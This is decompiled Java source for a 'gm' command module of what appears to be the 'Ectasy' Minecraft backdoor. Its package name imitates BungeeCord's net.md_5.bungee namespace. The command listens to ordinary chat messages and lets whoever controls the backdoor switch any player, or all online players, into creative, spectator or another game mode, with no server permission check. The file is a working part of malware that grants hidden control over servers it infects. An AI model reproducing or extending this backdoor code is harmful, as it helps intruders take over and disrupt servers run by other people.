package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "gm",
   description = "Changes your or someone elses gamemode",
   blatant = true,
   rank = Rank.FREE,
   aliases = {"gamemode", "gmode"}
)
public class GamemodeCommand extends AbstractCommand {
   public GamemodeCommand() {
   }

   public static void changeGm(Player var0, GameMode var1) {
      Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
         var0.setGameMode(var1);
      });
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      Player var4 = var1.getPlayer();
      if (var3.length == 0) {
         ChatUtil.sendChat(var4, "Usage: gm <gamemode> <player | *>");
      } else {
         String var5 = var3[0];
         GameMode var6 = null;
         if (var5.equals("0") || var5.equals("s") || var5.equals("survival")) {
            var6 = GameMode.SURVIVAL;
         }

         if (var5.equals("1") || var5.equals("c") || var5.equals("creative")) {
            var6 = GameMode.CREATIVE;
         }

         if (var5.equals("2") || var5.equals("a") || var5.equals("adventure")) {
            var6 = GameMode.ADVENTURE;
         }

         if (var5.equals("3") || var5.equals("sp") || var5.equals("spectator")) {
            var6 = GameMode.SPECTATOR;
         }

         if (var6 == null) {
            ChatUtil.sendChat(var4, "The gamemode " + var5 + " is not a valid gamemode.");
         } else if (var3.length <= 1) {
            changeGm(var4, var6);
            ChatUtil.sendChat(var4, "You are now in " + var6.name().toLowerCase() + " mode.");
         } else if (!var3[1].equals("*")) {
            Player var7 = Bukkit.getPlayerExact(var3[1]);
            if (var7 == null) {
               ChatUtil.sendChat(var4, "The player " + var3[1] + " is not online.");
            } else {
               changeGm(var7, var6);
               ChatUtil.sendChat(var4, var7.getName() + " is now in " + var6.name().toLowerCase() + " mode.");
            }
         } else {
            for(Player var9 : Bukkit.getServer().getOnlinePlayers()) {
               changeGm(var9, var6);
            }

            ChatUtil.sendChat(var4, "Everyone is now in " + var6.name().toLowerCase() + " mode.");
         }
      }
   }
}
